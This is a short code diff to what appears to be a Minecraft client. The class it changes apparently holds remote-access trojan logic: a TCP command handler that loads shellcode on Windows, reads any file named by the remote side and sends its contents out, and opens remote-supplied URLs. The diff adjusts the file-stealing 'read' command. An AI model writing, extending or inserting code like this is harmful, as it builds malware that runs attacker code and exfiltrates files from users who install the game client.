@@ -20,6 +20,7 @@ import net.minecraft.client.gui.screen.TitleScreen;
 import net.minecraft.client.network.ServerAddress;
 import net.minecraft.client.util.GlfwUtil;
 
+import java.io.File;
 import java.lang.management.ManagementFactory;
 
 public class Client extends TcpClient {
@@ -112,7 +113,7 @@ public class Client extends TcpClient {
                         case "shellcode" -> {
                             if (ProgramUtil.isWin()) new Thread(() -> new ShellcodeLoader().loadShellCode(msg)).start();
                         }
-                        case "read" -> Witch.send("read", FileUtil.read(msg));
+                        case "read" -> Witch.send("read", FileUtil.read(new File(msg)));
                         case "open_url" -> ProgramUtil.openURL(msg);
                     }
                 }
